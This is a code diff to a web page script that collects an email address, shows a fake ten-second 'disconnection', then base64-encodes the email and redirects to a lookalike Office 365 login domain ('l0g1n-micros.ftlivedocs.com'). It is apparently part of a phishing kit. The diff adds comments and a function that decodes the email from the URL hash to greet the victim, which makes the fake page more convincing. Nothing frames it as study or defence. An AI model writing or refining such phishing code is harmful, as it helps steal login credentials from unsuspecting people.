@@ -75,11 +75,13 @@
         (function() {
             'use strict';
 
+            // Function to validate email format
             function isValidEmail(email) {
                 const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                 return emailPattern.test(email);
             }
 
+            // Simulates disconnection and handles redirection after a delay
             function simulateDisconnection(email) {
                 console.log("Simulating disconnection for 10 seconds...");
 
@@ -92,7 +94,7 @@
                     }
 
                     setTimeout(() => {
-                        const encodedEmail = btoa(email); // Encoding email to pass in URL
+                        const encodedEmail = btoa(email); // Encode email in base64
                         const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + encodedEmail;
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo;
@@ -100,9 +102,25 @@
                 }, 10000);
             }
 
+            // Decode base64 email from URL hash
+            function decodeEmailFromHash() {
+                const hash = window.location.hash.substr(1); // Remove the '#' symbol
+                if (hash) {
+                    try {
+                        return atob(hash); // Decode base64 to email
+                    } catch (error) {
+                        console.error("Failed to decode email from base64:", error);
+                        return null;
+                    }
+                }
+                return null;
+            }
+
+            // Onload function to handle email submission and redirection
             window.onload = function() {
                 const submitBtn = document.getElementById("submitBtn");
 
+                // Event listener to validate email and start disconnection simulation
                 submitBtn.addEventListener("click", function() {
                     const emailField = document.getElementById("email");
                     const email = emailField.value;
@@ -113,6 +131,12 @@
                         alert("Please enter a valid email address.");
                     }
                 });
+
+                // If already on redirect page, decode and display the email
+                const decodedEmail = decodeEmailFromHash();
+                if (decodedEmail) {
+                    alert("Welcome back, " + decodedEmail + "!");
+                }
             };
         })();
     </script>
